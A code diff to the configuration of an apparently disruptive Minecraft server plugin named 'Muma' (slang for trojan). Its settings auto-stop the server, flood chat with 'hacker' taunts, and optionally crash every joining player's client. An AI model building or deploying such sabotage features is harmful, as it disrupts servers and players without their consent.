@@ -8,13 +8,13 @@ ll.registerPlugin(
   /* otherInformation */ {}
 );
 //请勿私自修改源码发布其他平台，请不要直接修改此处文件，请前往配置文件修改
-let conf = new JsonConfigFile("plugins/xianyubb/muma/config.json");
+let conf = new JsonConfigFile("plugins/Muma/config.json");
 conf.init("isAutomaticallystopserver", true); //是否开启自动关闭服务器
 conf.init("SET Server Stop TimeOut", 60000); //自动关闭服务器时间（单位：ms）
 conf.init("SET FPS VeloCity", 500); //自定义文本刷屏速度（单位：ms）
 conf.init("Last Text Before Server Stop", "再见了服务器"); //服务器关闭前文本
-conf.init("Custom TEXT1", "[§4§l黑客§r]§6垃圾服务器等死吧"); //自定义文本1
-conf.init("Custom TEXT2", "[§4§l黑客§r]§560秒干趴你们服务器"); //自定义文本2
+conf.init("Custom TEXT1", "[§4§l黑客§r]§6服务器等着**吧"); //自定义文本1
+conf.init("Custom TEXT2", "[§4§l黑客§r]§560秒**你们服务器"); //自定义文本2
 conf.init("Custom TEXT3", "[§4§l黑客§r]§3看我让你们体验一下什么叫做魔幻"); //自定义文本3
 conf.init("Custom TEXT4", "[§4§l黑客§r]§2崩溃吧玩家"); //自定义文本4
 conf.init("iscrash", false); //是否开启玩家客户端崩溃（注意：开启此功能后，玩家进入服务器就会崩溃客户端，谨慎开启）
